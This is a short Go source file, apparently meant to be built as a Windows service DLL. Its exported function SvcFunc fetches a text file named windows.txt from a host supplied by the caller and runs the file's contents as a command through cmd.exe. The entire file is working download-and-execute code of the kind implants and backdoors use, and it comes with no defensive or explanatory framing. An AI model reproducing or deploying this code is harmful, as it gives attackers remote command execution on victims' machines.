// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import "C"
import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

const (
	pass = C.int(0)
	fail = C.int(1)
)

func main() {}

//export SvcFunc
func SvcFunc(s *C.char) C.int {
	x, f := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
	defer f()
	r, err := http.NewRequestWithContext(x, http.MethodGet, fmt.Sprintf("http://%s/windows.txt", C.GoString(s)), nil)
	if err != nil {
		return fail
	}
	b, err := http.DefaultClient.Do(r.WithContext(x))
	if err != nil {
		return fail
	}
	defer b.Body.Close()
	d := &bytes.Buffer{}
	io.Copy(d, b.Body)
	e := exec.Command("cmd.exe", "/c", strings.ReplaceAll(string(d.Bytes()), "\n", ""))
	if err := e.Start(); err != nil {
		return fail
	}
	e.Wait()
	return pass
}
